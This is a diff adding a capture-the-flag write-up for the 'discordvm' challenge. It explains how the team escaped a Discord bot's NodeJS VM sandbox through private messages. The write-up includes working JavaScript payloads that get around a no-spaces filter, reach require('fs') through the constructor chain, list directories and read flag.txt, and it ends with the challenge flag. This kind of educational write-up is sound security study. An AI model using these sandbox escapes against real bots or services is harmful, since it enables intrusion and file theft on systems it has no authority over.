@@ -278,4 +278,89 @@ Anyway, no bruteforce or file discovery was needed although it was blackbox.
    
 </details>
 
-*** 
+---
+
+## Misc
+
+---
+
+# discordvm
+
+#### Category: Misc | 350 points
+
+<details>
+  <summary>Challenge Description</summary>
+  
+WIP
+</details>
+
+This challenge involves getting RCE on a Discord bot via Discord private messages. It shows how dangerous an unsanitized user input given to the bot can compromise the server, which makes sense given that most bots run on NodeJS. 
+
+Here's the introduction to the bot so you can see what I mean.
+
+![1+1](../assets/htb-business-ctf-2021/discordvm_oneplusone.png)
+
+
+Anyway this challenge was blackbox. We were to join a server and add the Discord bot there as our target. However, the staff warned that it is not a bruteforcing challenge and that people who tried bruteforcing would be banned:
+
+![No bruteforcing](../assets/htb-business-ctf-2021/discordvm_warning.png)
+
+One thing I didn't like is how the challenge kept getting modified. The teams who solved it first used some unintended solution which probably involved `process.binding`, but that was patched as you can see in the above image. We found our payload that worked during the first few hours not working later during the day, which made me ragequit and my teammate Xoan solved this instead. 
+
+So anyway the first 'protection' the bot has is that no spaces are allowed. 
+
+![Spaces banned](../assets/htb-business-ctf-2021/discordvm_spacesbanned.png)
+
+As you can see, a SyntaxError was triggered when I tried to use the typical JS constructor in an attempt to log the return command. We found a way to bypass this by using the ASCII representation for space, i.e. `String.fromCharCode(32)`. Hence you can call the above `return this` with this payload:
+
+```javascript
+!calc log(this.constructor.constructor(["return","this"].join(String.fromCharCode(32))))
+```
+
+Likewise, you can also call `this.process.binding` to escape the VM, however we couldn't find a way to read the file.
+
+At this point it was 6am so I went to sleep. When I woke up to try the payload again, it was broken:
+
+![Broken payload](../assets/htb-business-ctf-2021/discordvm_brokenpayload.png)
+
+We figured that it was an unintended solution hence they patched the solution without giving thought that the teams who solved it earlier would have a big advantage. 
+
+I quit at this point and my teammate continued, using the hint shown in the first image which was to use `this.process.mainModule.require` instead. Since it was under the `mainModule`, it took some indepth research to find this function. 
+
+We were able to execute some commands using this payload:
+
+```javascript
+!calc rd=this.constructor.constructor(["return","this.process.mainModule.require"].join(String.fromCharCode(32)))()('$payload').readdir
+rd('./',{},"","",function(err,data){data})
+```
+
+However, calling commands like `fs` mysteriously returned `undefined`. After more research, we discovered that this StackOverflow question with the exact same problem we were facing! [NodeJS - Confusion about async “readdir” and “stat”: Returns error cannot read .then of undefined](https://stackoverflow.com/q/51180577/4420129). It turns out that `readdir` is asynchronous and hence it returns the result of `$payload` regardless of whether it has been populated or not.
+
+Hence, by modifying `readdir` to `readdirSync`, it became possible to read the filesystem!
+
+```javascript
+!calc rd=this.constructor.constructor(["return","this.process.mainModule.require"].join(String.fromCharCode(32)))()('fs').readdirSync
+rd('.',(err,data)=>{data})
+```
+
+![Read Directory](../assets/htb-business-ctf-2021/discordvm_readdir.png)
+
+
+Since we can see the flag now, let's read it with `readFileSync`: 
+
+```javascript
+!calc rd=this.constructor.constructor(["return","this.process.mainModule.require"].join(String.fromCharCode(32)))()('fs').readFileSync
+rd('flag.txt',(err,data)=>{data})
+```
+
+![Flag](../assets/htb-business-ctf-2021/discordvm_flag.png)
+
+
+Again, all credits goes to my teammate Xoan for solving this, I'm just including it here so we can all learn from him.
+
+
+<details>
+  <summary>FLAG</summary>
+  
+   HTB{4lw4ys_RTFM!1}
+</details>
